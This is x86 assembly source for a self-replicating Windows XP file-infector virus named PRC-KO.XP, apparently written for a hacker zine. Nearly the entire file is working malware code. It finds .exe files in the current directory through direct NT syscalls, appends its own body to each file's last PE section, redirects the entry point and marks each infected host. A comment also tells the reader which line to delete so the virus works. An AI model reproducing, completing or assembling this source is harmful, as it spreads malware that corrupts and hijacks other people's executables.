;DISCLAIMER
;
;This code is only for research and educational purposes only. The assembling
;of this file will produce a fully functional virus, so you have been warned.
;If this kind of material is illegal in your country or state, you should
;remove it from your computer. The author of this virus declines any illegal
;activity performed by the possesor of the assembled form of this source code
;including possesion and/or spreading of the virus generated from this source
;code.
;
;This source code is provided "as is". The deliberated modification of this
;source code will derive in a new virus that must not be considered the virus
;sourced here. The author of the original source code will not be considered
;the author of the new modified or derivated virus.
;
;prc-ko source code.
;prc-ko is infector for XP only using NaTive NT apis via sysenter...
;infects exe files in current directory, proof of concept that this can be done prc-ko :)
;Writen for issue #2 of phearless zine... This is possible to modify to infect files
;in other dirs (sub, dot/dot) but it is a lot of debuging and experimenting and other shit
;for nothing... Use kernel32.dll -> portable and easy, NaTive APIs -> hard to understand, very
;complicated, undocumented etc... but luckily we have win2k src :))) from 1989?!?!? Now I know why
;it has so many buffer overflows in it....
;
; PRC-KO.XP ----------------- c0ded by deroko <deroko<at>gmail<dot>com
;                             http://deroko.headcoders.net
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
; NOTE : Many of constants are not needed but they are here since the beginning so I still have them
; in DA CODE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Most of constants that are used within sysenter calls like 0f0007 are still taboo for me
; I have traced all kernel32 calls trough ollydbg and that's how I got them, have no idea what they are
; but that's what kernel32 is using so it must be right...
; Last update : added EPO
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

.586 
.model flat, stdcall
locals
jumps

extrn MessageBoxA:proc

null                                 equ      0h
NtTerminateProcess                   equ    101h
NtCreateFile                         equ     25h
NtOpenFile                           equ     74h
NtClose                              equ     19h
NtWriteFile                          equ    112h
NtCreateSection                      equ     32h
NtMapViewOfSection                   equ     6Ch     
NtUnmapViewOfSection                 equ    10Bh
NtQueryDirectoryFile                 equ     91h
NtQueryInformationFile               equ     97h

     

PAGE_READWRITE                       equ      4h 
FILE_NON_DIRECTORY_FILE              equ     40h 
OBJ_CASE_INSENSITIVE                 equ     40h
OBJ_INHERIT                          equ      2h
OBJ_OPENIF                           equ     80h
FILE_OPEN_IF                         equ      3h
STANDARD_RIGHTS_REQUIRED             equ 0F0000h
SYNCHRONIZE                          equ 100000h
FILE_ATTRIBUTE_NORMAL                equ     80h
FILE_READ_DATA                       equ      1h
FILE_LIST_DIRECTORY                  equ      1h
FILE_WRITE_DATA                      equ      2h
FILE_ADD_FILE                        equ      2h
FILE_APPEND_DATA                     equ      4h
FILE_ADD_SUBDIRECTORY                equ      4h
FILE_CREATE_PIPE_INSTANCE            equ      4h
FILE_READ_EA                         equ      8h
FILE_READ_PROPERTIES                 equ      FILE_READ_EA
FILE_WRITE_EA                        equ      10h
FILE_WRITE_PROPERTIES                equ      FILE_WRITE_EA
FILE_READ_ATTRIBUTES                 equ      80h
FILE_WRITE_ATTRIBUTES                equ      100h
READ_CONTROL                         equ      20000h
STANDARD_RIGHTS_READ                 equ      READ_CONTROL
STANDARD_RIGHTS_WRITE                equ      READ_CONTROL
STANDARD_RIGHTS_EXECUTE              equ      READ_CONTROL
FILE_GENERIC_READ                    equ      STANDARD_RIGHTS_READ OR FILE_READ_DATA OR FILE_READ_ATTRIBUTES OR FILE_READ_EA OR SYNCHRONIZE
FILE_GENERIC_WRITE                   equ      STANDARD_RIGHTS_WRITE OR FILE_WRITE_DATA OR FILE_WRITE_ATTRIBUTES OR FILE_WRITE_EA OR FILE_APPEND_DATA OR SYNCHRONIZE


virus_size                           equ      prc_ko_end - prc_ko_start
signature                            equ      0deadbeefh    ;yammy
section_size                         equ      1000h
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Some includes by Jacky Qwerty
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
include       \tasm32\include\win32api.inc
include       \tasm32\include\useful.inc
include       \tasm32\include\pe.inc
include       \tasm32\include\mz.inc


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Some structs
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;NTSTATUS is something we don't need but I've included this b/c
;I want to make it clear in my head before I proced
NTSTATUS             STRUCT
       ValueName     dd     ?
       ValueType     dd     ?
       ValueData     dd     ?
       ValueLen      dd     ?
       Context       dd     ?
       ExntryCtx     dd     ?
NTSTATUS             ENDS

IO_STATUS_BLOCK      STRUCT
       ISB_Ntstatus  dd     ?     ;pointer to NTSTATUS struct
       ISB_inform    dd     ?     ;Information eg. FILE_OPENED, FILE_SUPERSEDED etc..
IO_STATUS_BLOCK      ENDS

OBJECT_ATTRIBUTES    STRUCT
       Length        dd     ?      ;len of struct
       RootDir       dd     ?      ;Handle to root dir 
       ObjectName    dd     ?      ;pointer to UNICODE_STRING
       Attributes    dd     ?      ;heh not sure how to explain
       SecurityDesc  dd     ?      ;Set to null for default SecurityDescriptor
       SecQualityOfS dd     ?      ;Set to 0 InitializeObjectAttributes so it is 0 always
OBJECT_ATTRIBUTES    ENDS

;ANSI and UNICODE string structs are the same so I call this struct AU
;like ANSI/UNICODE_STRUCT 
AU_STRING            STRUCT
       len           dw   ?
       maxlen        dw   ?
       buff          dd   ?
AU_STRING            ENDS

CURDIR               STRUCT
       CD_path       dd   ?
       CD_handle     dd   ?
CURDIR               ENDS

FILE_BOTH_DIRECTORY_INFORMATION STRUCT
       NextEntryOffset      dd     ?
       Unknown              dd     ?
       CreationTime         dq     ?
       LastAccessTime       dq     ?
       LastWriteTime        dq     ?
       ChangeTime           dq     ?
       EndOfFile            dq     ?
       AllocationSize       dq     ?
       FileAttributes       dd     ?
       FileNameLength       dd     ?
       EaInfomrationLength  dd     ?
       AltenateNameLength   db     ?
       AlternateName        dw     12     dup (?)
       dummychar            db     ?             ;alignemnt
       FileName             dw     ?             ;here starts unicode file name
FILE_BOTH_DIRECTORY_INFORMATION ENDS

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Here is sysenter macro, it's syntax is
; @sysenter syscall, number_of_args
; I have defined a few syscalls, and whole list may be obtained
; from ntdll.dll...
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@sysenter            macro  syscall, parameters
                     local  __@@1, __@@2
                     push   eax                  
                     jmp    __@@2      
__@@1:    
                     mov    eax, syscall    
                     mov    edx, esp
                     dw     340Fh                   ;sysenter 0F34h 
__@@2:
                     call   __@@1
                     add    esp, (parameters*4) + 4 ; + 1 dummy EIP
endm
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Now is time for more explaining about sysenter (realy stupid,
; but this is how it works), when we triger SYSENTER EIP and ESP
; are filed with data from SYSENTER_EIP_MSR and SYSENER_ESP_MSR
; There are also SYSENTER_CS_MSR and SYSENTER_SS_MSR, and it transfers
; execution to ring0 and voila we are in kernel mod (ring0) and
; that is how it works basically, and we can use any NaTive API
; to write code for XP only (tested on SP1, and problably will
; work on any other XPes :))
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Macro for converting ANSI to UNICODE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@ansi2unicode macro 
                     xor    eax, eax
                     lodsb
                     stosw
                     test   al, al
                     jnz    $-5
endm          

@give_me_eip  macro
                     local  __eip
                     call   __eip
__eip:
              endm
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Data definition dummy data so tasm can compile this shit
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.data
                     dd     ?

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;prc-ko.XP starts from here
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.code
__start:
prc_ko_start:
__main               proc   
                     LOCAL  unicode[256]:dword
                     LOCAL  temp[256]:byte    ;temp is ansi string created on stack
                     LOCAL  au_str:AU_STRING
                     LOCAL  ioblock:IO_STATUS_BLOCK
                     LOCAL  object:OBJECT_ATTRIBUTES
                     LOCAL  path[256]:word
                     LOCAL  dir_handle:dword
                     
                     fninit
                     
                     @SEH_SetupFrame <jmp __return_to_host>
                     mov    eax, dword ptr FS:[30h]
                     mov    eax, dword ptr [eax+10h]
                     add    eax, 24h                    ;CURDIR from PEB/_RTL_USER_PROCESS_PARAMETERS
                                         
                     push   eax
                     lea    edi, unicode
                     @pushsz       <"\??\">
                     pop    esi
                     @ansi2unicode
                     pop    esi
                     add    esi, 4
                     mov    esi, [esi]
                     sub    edi, 2
__copy_unicode:                     
                     lodsw
                     stosw
                     test   ax, ax
                     jz    __exit_copy_unicode

                     jmp    __copy_unicode
__exit_copy_unicode:                     
                     
                     
                     lea    edi, unicode
                     lea    esi, au_str
                     call   RtlInitUnicodeString, esi, edi
                     
                    
                     mov    object.Length, 18h
                     mov    object.RootDir, null
                     lea    eax, au_str
                     push   eax
                     pop    object.ObjectName
                     mov    object.Attributes, 40h
                     mov    object.SecurityDesc, null
                     mov    object.SecQualityOfS, null
                     
                     push   4021h
                     push   3
                     lea    eax, ioblock
                     push   eax
                     lea    eax, object
                     push   eax
                     push   100001h
                     lea    eax, dir_handle
                     push   eax
                     @sysenter     NtOpenFile, 6
                
;------------------------
; Look for first file
;------------------------
                     call    __give_me
                     dw     '<','.','e','x','e',0
__give_me:                                
                     pop     edi

                     lea    esi, au_str
                     call   RtlInitUnicodeString, esi, edi
                     
                     push   0
                     lea    esi, au_str
                     push   esi
                     push   1
                     push   3
                     push   256*2
                     lea    esi, path
                     push   esi
                     lea    esi, ioblock
                     push   esi
                     push   null
                     push   null
                     push   null
                     push   dir_handle
                     @sysenter     NtQueryDirectoryFile, 11
                     
                     
                     lea    esi, path
                     mov    eax, [esi.FileNameLength]
                     lea    edi, [esi.FileName]
                     mov    word ptr[edi+eax], null
                     call   OpenAndInfect,  edi, dir_handle
                     
                    
__next_file_search:
                     push   null
                     push   null
                     push   1
                     push   3
                     push   256*2
                     lea    esi, path
                     push   esi
                     lea    esi, ioblock
                     push   esi
                     push   null
                     push   null
                     push   null
                     push   dir_handle
                     @sysenter     NtQueryDirectoryFile, 11
                     test   eax, eax
                     jnz    __exit_search

                     lea    esi, path
                     mov    eax, [esi.FileNameLength]
                     lea    edi, [esi.FileName]
                     mov    word ptr[edi+eax], null
                     call   OpenAndInfect,  edi, dir_handle
                     jmp    __next_file_search                    
 __exit_search:                     
                     push   dir_handle
                     @sysenter     NtClose, 1
                     
                       
__return_to_host:                     
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Add host redirection 
; changing saved EIP on stack
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                     @SEH_RemoveFrame
                     mov    eax, dword ptr FS:[30h]
                     mov    eax, dword ptr[eax+8]
                     add    eax, dword ptr[eax+44h]
                     mov    edx, ebp
                     add    edx, 4
                     mov    [edx], eax

                     ret

__main               endp

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Virus signature
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                     db     "PRC-KO.XP",0
                     db     "coded by deroko",0
                     db     "PRC-KO.XP",0
                     db     "coded by deroko",0

RtlInitUnicodeString proc   near   RtlUnicodeString:dword, RtlUnicode:dword
                     push   edi
                     mov    edi, RtlUnicode
                     mov    edx, RtlUnicodeString
                     mov    dword ptr[edx], 0
                     mov    [edx+4], edi
                     or     edi, edi
                     jz     __exit
                     or     ecx, 0FFFFFFFFh
                     xor    eax, eax
                     repne  scasw
                     not    ecx
                     shl    ecx, 1
                     mov    word ptr [edx+2], cx
                     dec    ecx
                     dec    ecx
                     mov    word ptr[edx], cx
__exit:
                     pop    edi
                     leave
                     retn   8
RtlInitUnicodeString endp 

GetFileSize          proc   near   fileHandle:dword
                     LOCAL  lbuff[18h]:byte
                     LOCAL  ioblock:IO_STATUS_BLOCK
                     
                     push   5      ;FileStandardInformation
                     push   18h    ;Buffer size
                     lea    eax, lbuff
                     push   eax
                     lea    eax, ioblock
                     push   eax
                     push   fileHandle
                     @sysenter     NtQueryInformationFile, 5
                     mov    eax, dword ptr[ebp-10h]
                     leave 
                     ret    4 
GetFileSize          endp 


OpenAndInfect        proc   near   FileNamee:dword, curdirHandle
                     LOCAL  object:OBJECT_ATTRIBUTES
                     LOCAL  ioblock:IO_STATUS_BLOCK
                     LOCAL  au_str:AU_STRING
;Check this stairs :)
                     LOCAL  fd:dword
                     LOCAL  temp:dword
                     LOCAL  memptr:dword
                     LOCAL  sectsize:dword
                     LOCAL  sectoffs:qword
                     
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Set SEH frame
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                     @SEH_SetupFrame <jmp __exit_infection>
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;First make object_attributes
;for NtOpenFile
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

                     lea    esi, au_str
                     call   RtlInitUnicodeString, esi, FileNamee
                     
                     
                     mov    object.Length, 18h
                     lea    esi, au_str
                     mov    object.ObjectName, esi
                     push   curdirHandle
                     pop    object.RootDir
                     mov    object.Attributes, 40h
                     mov    object.SecurityDesc, 0
                     mov    object.SecQualityOfS, 0
                     
                     push   4060h
                     push   null
                     lea    eax, ioblock
                     push   eax
                     lea    eax, object
                     push   eax
                     push   FILE_GENERIC_READ or FILE_GENERIC_WRITE
                     lea    eax, fd
                     push   eax
                     @sysenter     NtOpenFile, 6
                     test   eax, eax
                     jnz    __exit_infection
                     
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Get File Size and increase file 
;size for 4096bytes
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                     call   GetFileSize, fd
                     mov    sectsize, eax
                     add    sectsize, 1000h

                     lea    edi, sectoffs
                     push   sectsize
                     pop    dword ptr[edi]                      
                     mov    dword ptr[edi+4], 0
                     
                     push   fd
                     push   08000000h
                     push   PAGE_READWRITE
                     lea    eax, sectoffs  ;This is Quadword!!! imagine :) 2^64 memory possible to map
                     push   eax
                     push   null
                     push   0F0007h
                     lea    eax, temp
                     push   eax
                     @sysenter     NtCreateSection, 7
                     test   eax, eax
                     jnz    __exit_close_infection

                     lea    edi, sectoffs
                     mov    dword ptr[edi],0
                     mov    dword ptr[edi-4],0
                     mov    memptr, 0
                     
                     push   4
                     push   null
                     push   1
                     lea    eax, sectsize
                     push   eax
                     lea    eax, sectoffs
                     push   eax
                     push   null
                     push   null
                     lea    eax, memptr
                     push   eax
                     push   -1
                     push   temp
                     @sysenter     NtMapViewOfSection, 10
                     test   eax, eax
                     jnz    __exit_2close_infection
 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Here comes prc-ko's infection  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;                   
                     mov    edi, memptr
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Check for MZ/PE if error SEH will exit this proc
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                     mov    ebx, memptr
                     mov    ax, 'MZ'
                     ror    ax, 8
                     cmp    word ptr[ebx], ax
                     jne    __normal_exit
                     add    ebx, [ebx.MZ_lfanew]
                     mov    ax, 'PE'
                     ror    ax, 8
                     cmp    word ptr[ebx], ax
                     jne    __normal_exit
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Is it infected?
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                     cmp    dword ptr[edi+40h], signature
                     je     __normal_exit               ;yeah, exit
                     mov    dword ptr[edi+40h], signature ;mark it as infected
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;We have valid PE, lets do something nice
;append to last section :)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                     ;ebx is pointing to pe header now everything is like in any other virus
                     movzx  ecx, [ebx.NT_FileHeader.FH_NumberOfSections]
                     mov    eax, ebx
                     add    eax, size IMAGE_NT_HEADERS
__last_section:
                     add    eax, size IMAGE_SECTION_HEADER
                     loop   __last_section
                     sub    eax, size IMAGE_SECTION_HEADER ;last section in eax... we hee lets rock
                     mov    edx, [ebx.NT_OptionalHeader.OH_AddressOfEntryPoint]
                     mov    dword ptr[edi+44h], edx

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Now lets do it eax is pointer to last section
; Append virus
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                     mov    edx, [eax.SH_SizeOfRawData]
                     cmp    edx, [eax.SH_VirtualSize]
                     jb     __SH_SizeOfRawData_Is_Smaller
                     mov    edx, [eax.SH_VirtualAddress]
                     add    edx, [eax.SH_VirtualSize]
                     mov    [ebx.NT_OptionalHeader.OH_AddressOfEntryPoint], edx
                     mov    edi, [eax.SH_PointerToRawData]
                     add    edi, [eax.SH_VirtualSize]
                     add    edi, memptr
                     jmp    __copy_virus                     
__SH_SizeOfRawData_Is_Smaller:
                     mov    edx, [eax.SH_VirtualAddress]
                     add    edx, [eax.SH_SizeOfRawData]
                     mov    [ebx.NT_OptionalHeader.OH_AddressOfEntryPoint], edx
                     mov    edi, [eax.SH_PointerToRawData]
                     add    edi, [eax.SH_SizeOfRawData]
                     add    edi, memptr
__copy_virus:        
                     add    [eax.SH_VirtualSize], section_size
                     add    [eax.SH_SizeOfRawData], section_size
                     add    [ebx.NT_OptionalHeader.OH_SizeOfImage], section_size             
                     call   __give_me_virus_start
__give_me_virus_start:                                          
                     pop    esi
                     sub    esi, __give_me_virus_start-prc_ko_start
                     mov    ecx, virus_size
                     rep    movsb
                     ;done                     
                     ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                     ;Read the fucking code and delete this line if you want prc-ko.xp 
                     ;to work
                     ;|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
                     ;VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
                     ;mov    [ebx.NT_OptionalHeader.OH_AddressOfEntryPoint], signature

__normal_exit:                    
                     push   memptr
                     push   -1
                     @sysenter     NtUnmapViewOfSection, 2
                                          
__exit_2close_infection:
                     push   temp
                     @sysenter     NtClose, 1                     
__exit_close_infection:
                     push   fd
                     @sysenter     NtClose, 1
__exit_infection:
                     @SEH_RemoveFrame
                     leave
                     ret    8
OpenAndInfect        endp
prc_ko_end:              
end __start
